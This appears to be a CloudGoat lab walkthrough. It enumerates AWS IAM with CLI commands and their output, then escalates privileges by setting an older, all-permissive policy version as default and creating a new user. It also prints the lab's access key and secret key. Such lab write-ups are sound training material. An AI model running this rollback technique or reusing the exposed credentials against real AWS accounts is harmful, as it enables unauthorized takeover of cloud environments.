```bash
#cloudgoat creds
cloudgoat_output_aws_account_id = 101435605421
cloudgoat_output_policy_arn = arn:aws:iam::101435605421:policy/cg-raynor-policy-cgidfxrmmmmk6b
cloudgoat_output_raynor_access_key_id = AKIARPHQIQGW5JJRABFP
cloudgoat_output_raynor_secret_key = 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
cloudgoat_output_username = raynor-cgidfxrmmmmk6b
```


>aws sts get-caller-identity --profile lab1
```
{
    "UserId": "AIDARPHQIQGW44F5TWX7J",
    "Account": "101435605421",
    "Arn": "arn:aws:iam::101435605421:user/raynor-cgidfxrmmmmk6b"
}
```

>aws iam list-attached-user-policies --user-name raynor-cgidfxrmmmmk6b --profile lab1
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-raynor-policy-cgidfxrmmmmk6b",
            "PolicyArn": "arn:aws:iam::101435605421:policy/cg-raynor-policy-cgidfxrmmmmk6b"
        }
    ]
}
```


>aws iam get-user --profile lab1
```
{
    "User": {
        "Path": "/",
        "UserName": "raynor-cgidfxrmmmmk6b",
        "UserId": "AIDARPHQIQGW44F5TWX7J",
        "Arn": "arn:aws:iam::101435605421:user/raynor-cgidfxrmmmmk6b",
        "CreateDate": "2020-09-11T07:56:47+00:00",
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-raynor-cgidfxrmmmmk6b"
            },
            {
                "Key": "Stack",
                "Value": "CloudGoat"
            },
            {
                "Key": "Scenario",
                "Value": "iam-privesc-by-rollback"
            }
        ]
    }
}
```



>aws iam list-users --profile lab1
```
{
    "Users": [
        {
            "Path": "/",
            "UserName": "cloudgoat",
            "UserId": "AIDARPHQIQGWVWYM3EP7Q",
            "Arn": "arn:aws:iam::101435605421:user/cloudgoat",
            "CreateDate": "2020-09-11T05:15:20+00:00"
        },
        {
            "Path": "/",
            "UserName": "raynor-cgidfxrmmmmk6b",
            "UserId": "AIDARPHQIQGW44F5TWX7J",
            "Arn": "arn:aws:iam::101435605421:user/raynor-cgidfxrmmmmk6b",
            "CreateDate": "2020-09-11T07:56:47+00:00"
        }
    ]
}
```

>aws iam list-groups --profile lab1
```
{
    "Groups": []
}
```

>aws iam list-roles --profile lab1
```
{
    "Roles": [
        {
            "Path": "/aws-service-role/support.amazonaws.com/",
            "RoleName": "AWSServiceRoleForSupport",
            "RoleId": "AROAISNV4MOA4I2TN7NTA",
            "Arn": "arn:aws:iam::101435605421:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport",
            "CreateDate": "2018-07-19T14:44:46+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "support.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Enables resource access for AWS to provide billing, administrative and support services",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/trustedadvisor.amazonaws.com/",
            "RoleName": "AWSServiceRoleForTrustedAdvisor",
            "RoleId": "AROAIWXNTR33YZEIQ7KME",
            "Arn": "arn:aws:iam::101435605421:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor",
            "CreateDate": "2018-07-19T14:44:46+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "trustedadvisor.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.",
            "MaxSessionDuration": 3600
        }
    ]
}
```


>aws iam list-attached-role-policies --role-name AWSServiceRoleForTrustedAdvisor --profile lab1
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "AWSTrustedAdvisorServiceRolePolicy",
            "PolicyArn": "arn:aws:iam::aws:policy/aws-service-role/AWSTrustedAdvisorServiceRolePolicy"
        }
    ]
}

>aws iam list-attached-user-policies --user-name raynor-cgidfxrmmmmk6b --profile lab1
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-raynor-policy-cgidfxrmmmmk6b",
            "PolicyArn": "arn:aws:iam::101435605421:policy/cg-raynor-policy-cgidfxrmmmmk6b"
        }
    ]
}
```

>aws iam list-policy-versions --policy-arn arn:aws:iam::101435605421:policy/cg-raynor-policy-cgidfxrmmmmk6b --profile lab1

```
{
    "Versions": [
        {
            "VersionId": "v5",
            "IsDefaultVersion": false,
            "CreateDate": "2020-09-11T07:57:07+00:00"
        },
        {
            "VersionId": "v4",
            "IsDefaultVersion": false,
            "CreateDate": "2020-09-11T07:57:07+00:00"
        },
        {
            "VersionId": "v3",
            "IsDefaultVersion": false,
            "CreateDate": "2020-09-11T07:57:05+00:00"
        },
        {
            "VersionId": "v2",
            "IsDefaultVersion": false,
            "CreateDate": "2020-09-11T07:57:05+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2020-09-11T07:56:47+00:00"
        }
    ]
}
```

>aws iam get-policy-version --policy-arn arn:aws:iam::101435605421:policy/cg-raynor-policy-cgidfxrmmmmk6b --version-id v1 --profile lab1
```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "IAMPrivilegeEscalationByRollback",
                    "Action": [
                        "iam:Get*",
                        "iam:List*",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2020-09-11T07:56:47+00:00"
    }
}
```

>aws iam get-policy-version --policy-arn arn:aws:iam::101435605421:policy/cg-raynor-policy-cgidfxrmmmmk6b --version-id v2 --profile lab1
```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": {
                "Effect": "Deny",
                "Action": "*",
                "Resource": "*",
                "Condition": {
                    "NotIpAddress": {
                        "aws:SourceIp": [
                            "192.0.2.0/24",
                            "203.0.113.0/24"
                        ]
                    }
                }
            }
        },
        "VersionId": "v2",
        "IsDefaultVersion": false,
        "CreateDate": "2020-09-11T07:57:05+00:00"
    }
}
```

>aws iam get-policy-version --policy-arn arn:aws:iam::101435605421:policy/cg-raynor-policy-cgidfxrmmmmk6b --version-id v4 --profile lab1
```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": {
                "Effect": "Allow",
                "Action": [
                    "s3:ListBucket",
                    "s3:GetObject",
                    "s3:ListAllMyBuckets"
                ],
                "Resource": "*"
            }
        },
        "VersionId": "v4",
        "IsDefaultVersion": false,
        "CreateDate": "2020-09-11T07:57:07+00:00"
    }
}
```

>aws iam get-policy-version --policy-arn arn:aws:iam::101435605421:policy/cg-raynor-policy-cgidfxrmmmmk6b --version-id v3 --profile lab1

```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": "*",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v3",
        "IsDefaultVersion": false,
        "CreateDate": "2020-09-11T07:57:05+00:00"
    }
}
```

***create user by changing the default policy to v3 where all actions were allowed.***

***By changing to v3 we can now create new user which we were unable to do previously.***

`set default version to v3`

>aws iam set-default-policy-version --policy-arn arn:aws:iam::101435605421:policy/cg-raynor-policy-cgidfxrmmmmk6b --version-id v3 --profile lab1

//create new user 
>aws iam create-user --user-name theenigma --profile lab1